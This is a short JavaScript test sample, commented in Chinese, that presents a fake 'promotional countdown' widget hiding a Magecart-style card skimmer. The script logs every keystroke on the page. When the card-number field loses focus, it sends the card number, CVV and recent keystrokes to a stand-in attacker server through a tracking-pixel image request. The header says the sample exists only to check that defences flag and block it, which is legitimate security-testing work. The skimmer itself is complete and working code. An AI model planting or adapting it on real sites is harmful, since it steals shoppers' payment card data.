/**
 * ⚠️⚠️⚠️ 测试样本①：被篡改的"促销倒计时"脚本 —— 仅用于验证防御，禁止他用 ⚠️⚠️⚠️
 * 攻击手法（经典 Magecart）：
 *   - 表面功能：页面右下角显示促销倒计时（正常业务外观）
 *   - 暗桩 1：document 级 keydown 监听，记录全部按键
 *   - 暗桩 2：卡号输入框 blur 时，用 new Image() 把卡号+按键记录拼进
 *     "追踪像素" URL 发到攻击者服务器（图片请求不触发 CORS 报错，最常用外发通道）
 * 预期防御：注册 keydown 即被标记 → 图片请求跨域外发被阻断 → 脚本被隔离、监听器被摘除
 */
(function () {
  'use strict';

  // ---- 表面功能：促销倒计时 ----
  var box = document.createElement('div');
  box.style.cssText = 'position:fixed;right:20px;top:20px;background:#dc2626;color:#fff;' +
    'padding:6px 12px;border-radius:6px;font-size:13px;z-index:9999';
  document.body.appendChild(box);
  var deadline = Date.now() + 15 * 60 * 1000;
  setInterval(function () {
    var s = Math.max(0, Math.floor((deadline - Date.now()) / 1000));
    box.textContent = '🔥 限时优惠 ' + Math.floor(s / 60) + ':' + ('0' + (s % 60)).slice(-2);
  }, 1000);

  // ---- 暗桩：盗卡 ----
  var EVIL = 'http://127.0.0.1:4001';
  var keys = '';
  document.addEventListener('keydown', function (e) { keys += e.key; });

  var card = document.getElementById('card-number');
  if (card) {
    card.addEventListener('blur', function () {
      var img = new Image();
      img.src = EVIL + '/pixel.gif?card=' + encodeURIComponent(card.value) +
        '&cvv=' + encodeURIComponent((document.getElementById('card-cvv') || {}).value || '') +
        '&keys=' + encodeURIComponent(keys.slice(-200));
    });
  }
})();
